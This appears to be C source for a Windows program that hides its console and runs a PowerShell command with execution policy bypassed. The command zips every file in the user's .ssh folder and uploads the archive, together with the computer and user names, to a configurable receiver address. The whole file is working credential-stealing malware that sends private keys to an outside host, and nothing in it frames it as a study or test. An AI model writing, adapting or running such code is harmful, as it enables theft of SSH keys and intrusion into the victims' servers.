#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_IP "192.168.137.5"       // Change to your receiver's IP
#define DEFAULT_PORT 8080                 // Change to your receiver's port
#define TIMEOUT_SECONDS 30
#define MAX_COMMAND_SIZE 8192

int main() {
    // Hide the console window
    FreeConsole();

    char command[MAX_COMMAND_SIZE];
    int bytes_written = 0;
    
    // Build the PowerShell command with error handling
    bytes_written = snprintf(command, sizeof(command),
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
        "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue; "
        "try { "
        "  Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop; "
        "  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
        "  $zipStream = New-Object System.IO.MemoryStream; "
        "  $zipArchive = New-Object System.IO.Compression.ZipArchive($zipStream, [System.IO.Compression.ZipArchiveMode]::Create, $true); "
        "  $sshPath = Join-Path $env:USERPROFILE '.ssh'; "
        "  if (Test-Path $sshPath) { "
        "    $count = 0; "
        "    Get-ChildItem $sshPath -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "
        "      try { "
        "        $relativePath = $_.FullName.Substring($sshPath.Length + 1).Replace(chr(92), '/'); "
        "        $entry = $zipArchive.CreateEntry($relativePath); "
        "        $entryStream = $entry.Open(); "
        "        $bytes = [System.IO.File]::ReadAllBytes($_.FullName); "
        "        $entryStream.Write($bytes, 0, $bytes.Length); "
        "        $entryStream.Close(); "
        "        $count++; "
        "      } catch { } "
        "    }; "
        "    if ($count -eq 0) { Write-Output 'WARNING: No files found in .ssh folder' | Out-Null }; "
        "  } else { Write-Output 'WARNING: .ssh folder not found' | Out-Null }; "
        "  $zipArchive.Dispose(); "
        "  $zipBytes = $zipStream.ToArray(); "
        "  if ($zipBytes.Length -gt 0) { "
        "    $wc = New-Object System.Net.WebClient; "
        "    $wc.Timeout = 30000; "
        "    $wc.Headers.Add('X-ComputerName', $env:COMPUTERNAME); "
        "    $wc.Headers.Add('X-UserName', $env:USERNAME); "
        "    $wc.Headers.Add('Content-Type', 'application/octet-stream'); "
        "    $response = $wc.UploadData('http://%s:%d/upload', 'POST', $zipBytes); "
        "    Write-Output 'Upload succeeded' | Out-Null; "
        "  } else { Write-Output 'ERROR: Zip file is empty' | Out-Null }; "
        "} catch { "
        "  Write-Output ('ERROR: ' + $_.Exception.Message) | Out-Null; "
        "  exit 1; "
        "}"
        "\"",
        DEFAULT_IP, DEFAULT_PORT);

    // Verify command was properly formatted
    if (bytes_written >= sizeof(command) - 1) {
        // Command was truncated
        return 1;
    }

    // Execute the PowerShell command
    int result = system(command);
    
    // Exit with appropriate code
    return (result == 0) ? 0 : 1;
}